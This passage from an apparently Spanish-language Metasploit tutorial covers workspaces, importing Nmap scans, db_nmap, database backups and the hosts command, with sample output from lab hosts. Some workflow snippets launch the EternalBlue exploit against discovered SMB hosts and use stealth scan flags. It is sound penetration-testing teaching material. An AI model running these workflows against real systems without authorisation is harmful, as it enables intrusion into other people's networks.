├── Cliente_Globex_Inc/
│   ├── network_map.png
│   ├── exploit_log.txt
│   └── findings.xlsx
│
└── Cliente_Initech/
    ├── scan_results.xml
    └── notes.md
```

**WORKSPACES en Metasploit funcionan EXACTAMENTE IGUAL**:

```
METASPLOIT DATABASE:
├── Workspace: "default"
│   ├── Hosts: 0
│   ├── Services: 0
│   └── (vacío - workspace inicial)
│
├── Workspace: "acme_corp_pentest_2025"
│   ├── Hosts: 87 entradas
│   ├── Services: 342 entradas
│   ├── Vulns: 243 entradas
│   ├── Creds: 47 entradas
│   └── Loot: 12 archivos
│
├── Workspace: "globex_inc_internal_audit"
│   ├── Hosts: 45 entradas
│   ├── Services: 189 entradas
│   ├── Vulns: 102 entradas
│   └── ...
│
└── Workspace: "initech_webapp_test"
    ├── Hosts: 5 entradas
    ├── Services: 23 entradas
    └── ...
```

**Cada workspace es COMPLETAMENTE INDEPENDIENTE**.

---

### Ventajas Críticas de Usar Workspaces

#### 1. Separación Total de Datos

```
SIN WORKSPACES (todo mezclado):

msf6 > hosts
[Hosts de TODOS los clientes mezclados]
192.168.1.10  ← ¿De qué cliente es?
10.10.10.20   ← ¿De qué pentest?
172.16.0.50   ← ¿Cuándo lo escaneé?
...
[200+ hosts sin contexto]

CON WORKSPACES (organizados):

msf6 > workspace acme_corp
msf6 acme_corp > hosts
[Solo hosts de Acme Corp]
192.168.1.10
192.168.1.20
192.168.1.30

msf6 acme_corp > workspace globex_inc  
msf6 globex_inc > hosts
[Solo hosts de Globex Inc]
10.10.10.5
10.10.10.10
10.10.10.15
```

#### 2. Exportación Limpia por Cliente

```bash
# Exportar SOLO datos de Acme Corp
msf6 > workspace acme_corp
msf6 acme_corp > db_export -f xml acme_corp_report.xml
[*] Exported 87 hosts, 342 services, 243 vulns
[*] Only Acme Corp data included

# Exportar SOLO datos de Globex Inc
msf6 > workspace globex_inc
msf6 globex_inc > db_export -f xml globex_inc_report.xml
[*] Exported 45 hosts, 189 services, 102 vulns
[*] Only Globex Inc data included
```

**SIN workspaces**: Exportarías TODO mezclado, tendrías que filtrar manualmente.

#### 3. Evitar Mezclar Clientes (Ética/Legal)

```
PESADILLA LEGAL SIN WORKSPACES:

1. Haces pentest de Cliente A
2. Haces pentest de Cliente B  
3. Exportas reporte para Cliente A
4. PERO el reporte incluye accidentalmente IPs de Cliente B
5. Cliente A ve información confidencial de Cliente B
6. VIOLACIÓN DE CONFIDENCIALIDAD
7. DEMANDA LEGAL
8. PÉRDIDA DE REPUTACIÓN
9. POSIBLE PÉRDIDA DE LICENCIA

CON WORKSPACES:
  - Cada cliente en workspace separado
  - Imposible mezclar por accidente
  - Exportas solo el workspace específico
  - 100% separación garantizada
```

#### 4. Workflow Más Limpio

```bash
# Lunes: Trabajas en Cliente A
$ msfdb run
msf6 > workspace acme_corp
msf6 acme_corp > db_nmap ...
msf6 acme_corp > use exploit...

# Martes: Trabajas en Cliente B
$ msfdb run  
msf6 > workspace globex_inc
msf6 globex_inc > db_nmap ...

# Miércoles: Vuelves a Cliente A
$ msfdb run
msf6 > workspace acme_corp
msf6 acme_corp > hosts  ← Ves donde te quedaste
```

---

### Comandos de Workspace

#### Ver Workspace Actual

```bash
msf6 > workspace

* default
```

El `*` indica el workspace **actualmente activo**.

#### Crear Nuevo Workspace

```bash
msf6 > workspace -a acme_corp_2025

[*] Added workspace: acme_corp_2025
[*] Workspace: acme_corp_2025
```

**Desglose**:
- `workspace` = Comando
- `-a` = Add (agregar/crear)
- `acme_corp_2025` = Nombre del workspace

**Naming conventions recomendadas**:
- `cliente_tipo_año`: acme_corp_pentest_2025
- `cliente_red`: globex_dmz, globex_internal  
- `proyecto_fase`: initech_phase1, initech_phase2

**Automáticamente cambia al nuevo workspace** después de crearlo.

#### Listar Todos los Workspaces

```bash
msf6 > workspace

  default
* acme_corp_2025
  globex_inc_2025
  initech_webapp
```

El `*` muestra cuál está activo.

#### Cambiar de Workspace

```bash
msf6 acme_corp_2025 > workspace globex_inc_2025

[*] Workspace: globex_inc_2025

msf6 globex_inc_2025 >
```

**Nota**: El prompt cambia para mostrar el workspace activo.

#### Borrar un Workspace

```bash
msf6 > workspace -d old_project

[*] Deleted workspace: old_project
[*] Deleted 150 hosts
[*] Deleted 423 services
[*] Deleted 87 vulns
[*] Deleted 34 creds
```

**⚠️ ADVERTENCIA**: Esto borra **PERMANENTEMENTE** todos los datos de ese workspace.

**NO hay "¿Estás seguro?"** - se borra inmediatamente.

#### Borrar TODOS los Workspaces

```bash
msf6 > workspace -D

[!] This will DELETE ALL WORKSPACES and their data!
Are you sure? [y/N]: y

[*] Deleted workspace: default
[*] Deleted workspace: acme_corp_2025
[*] Deleted workspace: globex_inc_2025
[*] All workspaces deleted
```

**⚠️⚠️⚠️ EXTREMO CUIDADO**: Esto borra **ABSOLUTAMENTE TODO**.

Solo úsalo si:
- Quieres empezar completamente de cero
- Estás en una VM de training
- Has hecho backup con `db_export`

#### Renombrar Workspace

```bash
msf6 > workspace -r old_name new_name

[*] Renamed workspace: old_name → new_name
```

**Útil cuando**:
- Te equivocaste en el nombre
- Cliente cambió de nombre
- Quieres reorganizar

#### Ver Workspaces con Más Detalle

```bash
msf6 > workspace -v

Workspaces
==========

  current  name              hosts  services  vulns  creds  loot
  -------  ----              -----  --------  -----  -----  ----
  *        acme_corp_2025    87     342       243    47     12
           globex_inc_2025   45     189       102    23     5
           initech_webapp    5      23        8      2      0
           default           0      0         0      0      0
```

**Súper útil** para ver de un vistazo cuánta información tienes en cada workspace.

#### Ayuda de Workspace

```bash
msf6 > workspace -h

Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r <old> <new>   Rename workspace
    workspace -h               Show this help information
```

---

### Workflow Completo con Workspaces

**Ejemplo Real del Día a Día**:

```bash
# ═══════════════════════════════════════════════
# LUNES - INICIO DE PENTEST PARA CLIENTE NUEVO
# ═══════════════════════════════════════════════

# 1. Iniciar Metasploit
$ msfdb run

# 2. Crear workspace para el cliente
msf6 > workspace -a acme_corp_external_pentest_Q1_2025
[*] Added workspace: acme_corp_external_pentest_Q1_2025
[*] Workspace: acme_corp_external_pentest_Q1_2025

# 3. Verificar que estás en el workspace correcto
msf6 acme_corp... > workspace
  default
* acme_corp_external_pentest_Q1_2025  ← ✅ Activo

# 4. Hacer discovery
msf6 acme_corp... > db_nmap -sV -sC 192.168.1.0/24
[*] Nmap scan running...

# 5. Ver resultados
msf6 acme_corp... > hosts
[87 hosts found]

# 6. Continuar con exploitation
msf6 acme_corp... > use exploit/...
msf6 acme_corp... > run

# ═══════════════════════════════════════════════
# MIÉRCOLES - CAMBIO A OTRO CLIENTE
# ═══════════════════════════════════════════════

# 7. Cambiar a otro workspace
msf6 acme_corp... > workspace -a globex_inc_webapp_test_2025
[*] Added workspace: globex_inc_webapp_test_2025

# 8. Trabajar en el nuevo cliente
msf6 globex_inc... > db_nmap -sV 10.10.10.0/24
...

# ═══════════════════════════════════════════════
# VIERNES - VOLVER A CLIENTE ANTERIOR
# ═══════════════════════════════════════════════

# 9. Volver al primer cliente
msf6 globex_inc... > workspace acme_corp_external_pentest_Q1_2025
[*] Workspace: acme_corp_external_pentest_Q1_2025

# 10. Ver donde te quedaste
msf6 acme_corp... > hosts
[87 hosts - same as before]

msf6 acme_corp... > sessions
[3 active sessions]

# ═══════════════════════════════════════════════
# FIN DE ENGAGEMENT - EXPORTAR REPORTE
# ═══════════════════════════════════════════════

# 11. Exportar solo datos de Acme Corp
msf6 acme_corp... > workspace acme_corp_external_pentest_Q1_2025
msf6 acme_corp... > db_export -f xml acme_corp_final_report_2025_01_21.xml
[*] Exported: 87 hosts, 342 services, 243 vulns, 47 creds

# 12. Después del pentest, archivar el workspace
#     (NO borrar - guardar para referencia futura)
msf6 > workspace -v
[*] acme_corp_external_pentest_Q1_2025 archived
```

---

Continúo en el siguiente mensaje con las secciones de Importar Scans, db_nmap, Backup, y los comandos hosts/services/creds/loot...## 📥 Importar Resultados de Scans

### ¿Por Qué Importar Scans?

Muchas veces ejecutás scans **fuera** de Metasploit, por ejemplo:

```bash
# Ejecutaste Nmap antes de abrir Metasploit
$ nmap -sV -sS -oX target_scan.xml 192.168.1.0/24
[... scan completes ...]

# Ejecutaste Nessus y exportaste resultados
File: nessus_scan_results.nessus

# Ejecutaste Nexpose
File: nexpose_export.xml
```

Ahora tenés archivos XML con resultados, pero están **fuera** de Metasploit.

**`db_import`** te permite **meter esos resultados** directamente en la database de Metasploit.

### Formatos Soportados

**Preferido**: `.xml` (XML)

**¿Por qué XML?**
- ✅ Contiene TODA la información (puertos, servicios, versiones, OS detection, scripts NSE)
- ✅ Fácil de parsear programáticamente
- ✅ Estándar de industria (Nmap, Nessus, Nexpose, OpenVAS)
- ✅ Portable entre herramientas

**Otros formatos soportados**:
- `.nmap` - Texto plano de Nmap (menos información)
- `.nessus` - Formato nativo de Nessus
- `.nbe` - Nessus NBE format
- `.nexpose` - Nexpose XML

### Ejemplo: Importar Scan de Nmap

**Archivo de salida de Nmap** (`Target.nmap` - texto plano):

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 20:54 UTC
Nmap scan report for 10.10.10.40
Host is up (0.017s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 60.81 seconds
```

**Problema**: Este formato de texto plano es **difícil de parsear**.

**Mejor**: Exportar como XML desde el principio:

```bash
$ nmap -sV -sS -oX target.xml 192.168.1.40
                     ↑
                  Output XML
```

### Importar a Metasploit

```bash
msf6 > db_import Target.xml

[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.10.9'
[*] Importing host 10.10.10.40
[*] Successfully imported ~/Target.xml
```

**Desglose de la Salida**:

| Línea | Significado |
|-------|-------------|
| `Importing 'Nmap XML' data` | Detectó automáticamente que es formato Nmap XML |
| `Parsing with 'Nokogiri'` | Usando librería XML parser de Ruby (Nokogiri) |
| `Importing host 10.10.10.40` | Encontró y procesó el host |
| `Successfully imported` | ✅ Importación completada sin errores |

### Verificar la Importación

#### Ver Hosts Importados

```bash
msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.40             Unknown                    device         
```

**Columnas**:
- `address` = Dirección IP del host
- `os_name` = Sistema operativo (si Nmap lo detectó)
- `purpose` = Tipo de dispositivo (device, server, client, firewall)

**"Unknown"** significa que Nmap no pudo determinar el OS con certeza.

#### Ver Servicios Importados

```bash
msf6 > services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC
```

**Cada servicio está vinculado a su host** automáticamente.

### Relación entre Tablas (Database Schema)

```
TABLA: hosts
┌────┬──────────────┬─────────┬─────────┐
│ id │ address      │ os_name │ purpose │
├────┼──────────────┼─────────┼─────────┤
│ 1  │ 10.10.10.40  │ Unknown │ device  │
└────┴──────────────┴─────────┴─────────┘
                ↑
                │ Foreign Key
                │
TABLA: services
┌────┬─────────┬──────┬──────────────┬───────┬──────────────────────┐
│ id │ host_id │ port │ name         │ state │ info                 │
├────┼─────────┼──────┼──────────────┼───────┼──────────────────────┤
│ 1  │   1     │ 135  │ msrpc        │ open  │ Microsoft Windows... │
│ 2  │   1     │ 139  │ netbios-ssn  │ open  │ Microsoft Windows... │
│ 3  │   1     │ 445  │ microsoft-ds │ open  │ Windows 7-10...      │
│ 4  │   1     │ 49152│ msrpc        │ open  │ Microsoft Windows... │
└────┴─────────┴──────┴──────────────┴───────┴──────────────────────┘
              ↑
         Esta columna vincula cada servicio con su host
         (services.host_id = hosts.id)
```

**Esta relación permite consultas como**:

```bash
# "Dame todos los servicios del host 10.10.10.40"
msf6 > services 10.10.10.40

# Internamente ejecuta algo así:
# SELECT * FROM services WHERE host_id = 
#   (SELECT id FROM hosts WHERE address = '10.10.10.40');
```

---

## 🔍 Usar Nmap Dentro de MSFconsole

### El Problema del Workflow Tradicional

**SIN `db_nmap`**:

```bash
1. Estás en msfconsole
2. Sales de msfconsole (Ctrl+Z o exit)
3. Ejecutas Nmap en bash
   $ nmap -sV -sS -oX scan.xml 192.168.1.0/24
4. Esperas a que termine (5-10 minutos)
5. Vuelves a entrar a msfconsole
   $ msfconsole
6. Importas el XML
   msf6 > db_import scan.xml
7. Finalmente puedes trabajar con los datos

RESULTADO: 
  ❌ Cambias de contexto (MSF → Bash → MSF)
  ❌ Proceso manual tedioso
  ❌ Fácil olvidar importar
  ❌ Archivos XML temporales acumulándose
```

**CON `db_nmap`**:

```bash
1. Estás en msfconsole
2. Ejecutas db_nmap
   msf6 > db_nmap -sV -sS 192.168.1.0/24
3. Ves el output en tiempo real
4. Datos automáticamente en la database
5. Continúas trabajando

RESULTADO:
  ✅ Todo en un solo lugar
  ✅ Automático
  ✅ Sin archivos temporales
  ✅ Workflow fluido
```

### Comando: db_nmap

```bash
msf6 > db_nmap -sV -sS 10.10.10.8
```

**¿Qué hace `db_nmap` internamente?**

```
PASO 1: Ejecuta Nmap con los flags que especificaste
  └─> Spawns proceso: /usr/bin/nmap -sV -sS 10.10.10.8

PASO 2: Captura la salida en tiempo real (STDOUT)
  └─> La muestra en msfconsole con prefijo "[*] Nmap:"

PASO 3: Parsea los resultados automáticamente
  └─> Convierte output de Nmap a entradas de database

PASO 4: Importa a la database (sin archivo temporal)
  └─> INSERT INTO hosts ...
  └─> INSERT INTO services ...

PASO 5: ✅ LISTO - datos disponibles inmediatamente
```

### Ejemplo Completo

```bash
msf6 > db_nmap -sV -sS 10.10.10.8

[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 21:04 UTC
[*] Nmap: Nmap scan report for 10.10.10.8
[*] Nmap: Host is up (0.016s latency).
[*] Nmap: Not shown: 999 filtered ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/tcp open  http    HttpFileServer httpd 2.3
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed.
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds
```

**Observa**: Cada línea tiene el prefijo `[*] Nmap:` - esto significa que es output de Nmap, pero estás viéndolo desde msfconsole.

### Verificar Auto-Import

```bash
msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.8              Unknown                    device         
10.10.10.40             Unknown                    device         
```

**¡Ahora tenemos 2 hosts!**
- `10.10.10.40` (importado desde XML antes)
- `10.10.10.8` (escaneado con db_nmap recién)

```bash
msf6 > services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.8   80     tcp    http          open   HttpFileServer httpd 2.3
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10
10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC
...
```

**Todos los servicios juntos**, organizados por host.

### Ventajas de db_nmap vs Nmap Manual

| Ventaja | Explicación |
|---------|-------------|
| **Sin salir de MSF** | Todo el workflow en un solo lugar |
| **Auto-import** | No necesitas `db_import` manual |
| **Historial persistente** | Queda registrado en database |
| **Mismo sintaxis** | Todos los flags de Nmap funcionan igual |
| **Output en tiempo real** | Ves el progreso mientras escanea |
| **Sin archivos basura** | No crea archivos .xml temporales |
| **Integración perfecta** | Datos listos para exploits inmediatamente |

### Todos los Flags de Nmap Funcionan

```bash
# Scan básico (solo ping)
msf6 > db_nmap 192.168.1.10

# Scan con detección de versión
msf6 > db_nmap -sV 192.168.1.10

# Scan agresivo (OS detection + scripts + traceroute)
msf6 > db_nmap -A 192.168.1.10

# Scan de red completa
msf6 > db_nmap -sV 192.168.1.0/24

# Scan de puertos específicos
msf6 > db_nmap -p 80,443,8080 192.168.1.10

# Scan UDP (más lento)
msf6 > db_nmap -sU 192.168.1.10

# Scan con scripts NSE específicos
msf6 > db_nmap --script=vuln 192.168.1.10

# Scan sigiloso (evita detección)
msf6 > db_nmap -sS -T2 192.168.1.10

# Scan masivo rápido
msf6 > db_nmap -sV -T4 --min-rate 1000 192.168.1.0/24
```

**Cualquier cosa que funcione en Nmap, funciona en db_nmap.**

### Workflow Típico con db_nmap

```bash
# ═══════════════════════════════════════════
# INICIO DE PENTEST
# ═══════════════════════════════════════════

# 1. Crear workspace
msf6 > workspace -a acme_corp_2025

# 2. Discovery rápido (¿qué hosts están up?)
msf6 > db_nmap -sn 192.168.1.0/24
[*] Nmap: 87 hosts up

# 3. Ver hosts encontrados
msf6 > hosts
[87 hosts listed]

# 4. Scan completo de servicios
msf6 > db_nmap -sV -sC 192.168.1.0/24
[... scanning 87 hosts ...]

# 5. Ver servicios interesantes
msf6 > services -p 445
[Hosts con SMB]

# 6. Scan de vulnerabilidades con NSE
msf6 > db_nmap --script=vuln -p 445 192.168.1.0/24

# 7. Explotar directamente desde los resultados
msf6 > services -p 445 -R
RHOSTS => 192.168.1.10 192.168.1.20 ...

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > run
```

**TODO en Metasploit, sin salir nunca.**

---

## 💾 Backup de Datos

### ¿Por Qué Hacer Backup?

**ESCENARIO PESADILLA REAL**:

```
DÍA 14 DEL PENTEST (VIERNES):
──────────────────────────────
Has trabajado 2 semanas completas:
  ✅ 543 hosts descubiertos
  ✅ 1,847 servicios catalogados
  ✅ 387 vulnerabilidades documentadas
  ✅ 156 credenciales extraídas
  ✅ 45 sesiones Meterpreter (historial)
  ✅ 89 archivos de loot descargados
  ✅ 234 notas importantes

Valor estimado del trabajo: $15,000 USD

VIERNES 6:00 PM:
────────────────
Ejecutas un comando:

msf6 > msfdb delete  ← ¡POR ERROR!

[*] Deleting database...
[*] Deleted 543 hosts
[*] Deleted 1,847 services
[*] Deleted 387 vulnerabilities
[*] Deleted 156 credentials
[*] Deleted 89 loot files
[*] Database deleted successfully

Tú: *sudor frío*
    *pánico absoluto*
    *2 semanas de trabajo = PERDIDAS*

O PEOR:

- PostgreSQL crashea (corrupción de disco)
- Sistema se cuelga durante actualización
- Disk lleno, database corrompe
- Ransomware infecta tu Kali
- Error humano (borras directorio /var/lib/postgresql)

RESULTADO SIN BACKUP:
  ❌ TODO perdido
  ❌ Tienes que empezar de cero
  ❌ Cliente furioso (no puedes entregar)
  ❌ Pérdida económica masiva
  ❌ Reputación destruida
```

**LA REGLA DE ORO**: **Backups diarios, SIEMPRE.**

### Comando: db_export

```bash
msf6 > db_export -h

Usage:
    db_export -f <format> [filename]
    Format can be one of: xml, pwdump
[-] No output file was specified
```

**Formatos Disponibles**:

| Formato | Descripción | Contenido | Uso |
|---------|-------------|-----------|-----|
| `xml` | Metasploit XML completo | Hosts, services, vulns, creds, loot, notes, TODO | Backup total, reportes, migración |
| `pwdump` | Formato pwdump (solo creds) | Solo credenciales en formato `user:hash` | Password cracking con John/Hashcat |

### Exportar Backup Completo

```bash
msf6 > db_export -f xml backup.xml

[*] Starting export of workspace default to backup.xml [ xml ]...
[*] Finished export of workspace default to backup.xml [ xml ]...
```

**¿Qué contiene `backup.xml`?**

```xml
<?xml version="1.0"?>
<MetasploitV4>
  <hosts>
    <host>
      <address>10.10.10.8</address>
      <mac></mac>
      <name></name>
      <state>alive</state>
      <os-name>Unknown</os-name>
      <os-flavor></os-flavor>
      <os-sp></os-sp>
      <purpose>device</purpose>
      <info></info>
      <comments></comments>
      <created-at>2025-01-21 15:30:42 UTC</created-at>
      <updated-at>2025-01-21 15:30:42 UTC</updated-at>
    </host>
    <host>
      <address>10.10.10.40</address>
      <!-- ... more host data ... -->
    </host>
  </hosts>
  
  <services>
    <service>
      <host>10.10.10.8</host>
      <port>80</port>
      <proto>tcp</proto>
      <name>http</name>
      <state>open</state>
      <info>HttpFileServer httpd 2.3</info>
      <!-- ... more service data ... -->
    </service>
    <!-- ... more services ... -->
  </services>
  
  <vulnerabilities>
    <!-- vuln entries here -->
  </vulnerabilities>
  
  <credentials>
    <!-- credential entries here -->
  </credentials>
  
  <loot>
    <!-- loot file references here -->
  </loot>
  
  <notes>
    <!-- notes here -->
  </notes>
</MetasploitV4>
```

**TODO está ahí** - puedes restaurarlo más tarde.

### Importar Backup

```bash
msf6 > db_import backup.xml

[*] Importing 'Metasploit XML' data
[*] Import: Parsing with 'Nokogiri v1.10.9'
[*] Importing host 10.10.10.8
[*] Importing host 10.10.10.40
[*] Importing service http on 10.10.10.8:80
[*] Importing service msrpc on 10.10.10.40:135
[*] Importing service netbios-ssn on 10.10.10.40:139
[... continues ...]
[*] Successfully imported backup.xml

msf6 > hosts
[All your hosts are back]

msf6 > services
[All your services are back]

msf6 > creds
[All your credentials are back]
```

**Todos tus datos restaurados.**

### Mejores Prácticas de Backup

#### 1. Backup Diario con Timestamp

```bash
msf6 > db_export -f xml backup_$(date +%Y%m%d).xml

# Resultado: backup_20250121.xml
```

**Ventaja**: Múltiples versiones, puedes volver atrás en el tiempo.

```bash
$ ls backups/
backup_20250115.xml  (lunes)
backup_20250116.xml  (martes)
backup_20250117.xml  (miércoles)
backup_20250118.xml  (jueves)
backup_20250119.xml  (viernes)
backup_20250120.xml  (lunes semana 2)
backup_20250121.xml  (martes semana 2)
```

Si algo sale mal el martes, puedes volver al backup del lunes.

#### 2. Backup por Workspace

```bash
# Backup de cada cliente por separado
msf6 > workspace acme_corp
msf6 acme_corp > db_export -f xml acme_corp_backup.xml

msf6 > workspace globex_inc
msf6 globex_inc > db_export -f xml globex_inc_backup.xml

msf6 > workspace initech
msf6 initech > db_export -f xml initech_backup.xml
```

**Ventaja**: Backups separados por cliente (seguridad, organización).

#### 3. Backup Antes de Operaciones Peligrosas

```bash
# Antes de borrar algo
msf6 > db_export -f xml pre_delete_backup.xml
msf6 > hosts -d 192.168.1.100  # Ahora puedes borrar seguro

# Antes de exploit arriesgado
msf6 > db_export -f xml pre_exploit_backup.xml
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > run

# Antes de limpiar workspace
msf6 > db_export -f xml pre_cleanup_backup.xml
msf6 > workspace -d old_project
```

#### 4. Script de Backup Automático

```bash
#!/bin/bash
# Archivo: /usr/local/bin/msf_auto_backup.sh

DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/home/juan/msf_backups"

# Crear directorio si no existe
mkdir -p $BACKUP_DIR

# Conectar a msfconsole y exportar cada workspace
msfconsole -q -x "
  workspace -v | tail -n +3 | awk '{print \$2}' | while read ws; do
    workspace \$ws
    db_export -f xml $BACKUP_DIR/\${ws}_${DATE}.xml
  done
  exit
"

# Comprimir backups antiguos (más de 7 días)
find $BACKUP_DIR -name "*.xml" -mtime +7 -exec gzip {} \;

# Borrar backups muy antiguos (más de 30 días)
find $BACKUP_DIR -name "*.xml.gz" -mtime +30 -delete

echo "[+] Backup completed: $BACKUP_DIR"
echo "[+] Total backups: $(ls -1 $BACKUP_DIR | wc -l)"
```

**Hacerlo ejecutable**:

```bash
$ chmod +x /usr/local/bin/msf_auto_backup.sh
```

**Automatizar con Cron** (ejecutar diariamente a las 11:00 PM):

```bash
$ crontab -e

# Agregar esta línea:
0 23 * * * /usr/local/bin/msf_auto_backup.sh >> /var/log/msf_backup.log 2>&1
```

**Ahora cada noche a las 11 PM**:
- ✅ Se exporta cada workspace automáticamente
- ✅ Se comprimen backups antiguos (ahorra espacio)
- ✅ Se borran backups de más de 30 días
- ✅ Log completo en `/var/log/msf_backup.log`

#### 5. Backup Remoto (Seguridad Extra)

```bash
#!/bin/bash
# Backup local + copia a servidor remoto

# 1. Backup local
msf6 > db_export -f xml backup_$(date +%Y%m%d).xml

# 2. Copiar a servidor remoto (SCP)
$ scp backup_$(date +%Y%m%d).xml user@backup-server:/backups/metasploit/

# O a cloud (Dropbox, Google Drive, etc.)
$ rclone copy backup_$(date +%Y%m%d).xml remote:metasploit_backups/
```

**Ventaja**: Si tu laptop/VM se destruye, tienes copia en otro lugar.

---

## 🖥️ Comando: hosts

El comando `hosts` muestra todos los hosts descubiertos durante scans e interacciones.

### Uso Básico

```bash
msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.8              Unknown                    device         
10.10.10.40             Unknown                    device         
```

### Columnas Explicadas

| Columna | Descripción | Ejemplo |
|---------|-------------|---------|
| `address` | Dirección IP | 192.168.1.10 |
| `mac` | Dirección MAC (si está en la misma red local) | 00:0c:29:68:51:bb |
| `name` | Hostname (si se resolvió por DNS) | DC01.acme.local |
| `os_name` | Sistema operativo detectado | Windows 10, Ubuntu 20.04 |
| `os_flavor` | Variante del OS | Professional, Enterprise, Server |
| `os_sp` | Service Pack (Windows legacy) | SP1, SP2 |
| `purpose` | Tipo de dispositivo | server, client, device, firewall |
| `info` | Información adicional | Domain Controller, Web Server |
| `comments` | Tus notas personales | "Target principal", "NO tocar" |

### Ver Ayuda Completa

```bash
msf6 > hosts -h

Usage: hosts [ options ] [addr1 addr2 ...]

OPTIONS:
  -a,--add          Add the hosts instead of searching
  -d,--delete       Delete the hosts instead of searching
  -c <col1,col2>    Only show the given columns
  -C <col1,col2>    Only show the given columns until the next restart
  -h,--help         Show this help information
  -u,--up           Only show hosts which are up
  -o <file>         Send output to a file in CSV format
  -O <column>       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -i,--info         Change the info of a host
  -n,--name         Change the name of a host
  -m,--comment      Change the comment of a host
  -t,--tag          Add or specify a tag to a range of hosts

Available columns: address, arch, comm, comments, created_at, cred_count, 
detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, 
note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, 
scope, service_count, state, updated_at, virtual_host, vuln_count, tags
```

### Opciones Útiles

#### Agregar Host Manualmente

```bash
msf6 > hosts -a 192.168.1.100

[*] Added host: 192.168.1.100
```

**Cuándo usar**:
- Sabes que existe un host pero no lo escaneaste todavía
- Quieres marcarlo para escanear después
- Tienes información de otra fuente (OSINT, cliente te dio lista)

#### Mostrar Solo Columnas Específicas

```bash
msf6 > hosts -c address,os_name,purpose

Hosts
=====

address      os_name           purpose
-------      -------           -------
10.10.10.8   Windows 10        client
10.10.10.40  Windows Server... server
192.168.1.10 Ubuntu 20.04      server
```

**Mucho más limpio** cuando solo necesitas información específica.

#### Filtrar por Búsqueda (Search)

```bash
msf6 > hosts -S Windows

Hosts
=====

address      os_name           purpose
-------      -------           -------
10.10.10.40  Windows Server... server
192.168.1.20 Windows 10        client
192.168.1.30 Windows 11        client
```

**Muestra solo hosts que coincidan con "Windows"** en cualquier campo.

```bash
msf6 > hosts -S server

Hosts
=====

address      os_name           purpose
-------      -------           -------
10.10.10.40  Windows Server... server
192.168.1.10 Ubuntu 20.04      server
```

#### Mostrar Solo Hosts Activos (Up)

```bash
msf6 > hosts -u

[*] Showing only hosts that are up

Hosts
=====

address      state  os_name
-------      -----  -------
10.10.10.8   alive  Windows 10
10.10.10.40  alive  Windows Server
```

**Filtra hosts marcados como down/offline.**

#### Exportar a CSV

```bash
msf6 > hosts -o hosts_export.csv

[*] Exported 87 hosts to hosts_export.csv
```

**Útil para**:
- Análisis en Excel/LibreOffice
- Reportes para clientes
- Compartir con equipo

**Contenido del CSV**:

```csv
address,mac,name,os_name,os_flavor,purpose,info,comments
10.10.10.8,,"",Windows 10,Professional,client,"",""
10.10.10.40,,"DC01.acme.local",Windows Server 2019,Standard,server,Domain Controller,""
```

#### Ordenar por Columna

```bash
msf6 > hosts -O 1

[*] Ordering by column 1 (address)
```

**Ordena alfabéticamente/numéricamente** por la columna especificada.

#### **SUPER ÚTIL**: Establecer RHOSTS Automáticamente

```bash
msf6 > hosts -S Windows -R

RHOSTS => 10.10.10.40 192.168.1.20 192.168.1.30
```

**¿Qué acaba de pasar?**

1. Buscó todos los hosts que coinciden con "Windows"
2. Extrajo sus direcciones IP
3. Configuró automáticamente `RHOSTS` con esas IPs

**Workflow típico**:

```bash
# 1. Encontrar todos los hosts Windows con SMB
msf6 > services -p 445 | grep Windows
[Lista de hosts]

